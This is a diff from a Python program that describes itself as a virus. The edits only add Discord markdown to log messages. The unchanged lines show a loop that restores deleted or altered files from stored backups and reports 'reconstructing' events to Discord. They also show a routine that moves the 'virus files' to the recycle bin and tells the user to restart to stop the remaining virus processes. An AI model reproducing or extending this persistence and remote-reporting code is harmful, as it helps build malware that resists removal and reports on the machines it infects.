@@ -42,7 +42,7 @@ def check_resign():
                     for file_path in files_to_backup:
                         if os.path.exists(file_path):
                             send2trash.send2trash(file_path)
-                            log_to_discord(f"Moved {file_path} to recycle bin.")
+                            log_to_discord(f"`Moved {file_path} to recycle bin.`")
                     root = tk.Tk()
                     root.withdraw()
                     messagebox.showinfo("Success", "All virus files were moved into bin.\nRestart your computer to stop all remaining virus processes.")
@@ -52,7 +52,7 @@ def check_resign():
                     for file_path in files_to_backup:
                         if os.path.exists(file_path):
                             os.rename(file_path, os.path.join(trash_dir, os.path.basename(file_path)))
-                            log_to_discord(f"Moved {file_path} moved to Desktop/trash.")
+                            log_to_discord(f"`Moved {file_path} moved to Desktop/trash.`")
                     root = tk.Tk()
                     root.withdraw()
                     messagebox.showinfo("Success", "All virus files were moved to <user>/Desktop/trash/. You can review the code and safely delete it.\nRestart your computer to stop all remaining virus processes.")
@@ -75,7 +75,7 @@ while True:
         backup = backuped_files[index]
         try:
             if not os.path.exists(path) or open(path, "rb").read() != backup:
-                log_to_discord(f"File {path} was removed, reconstructing", important=True)
+                log_to_discord(f"*File {path} was removed, reconstructing*", important=True)
                 with open(path, "wb") as file:
                     file.write(backup)
         except Exception as e:
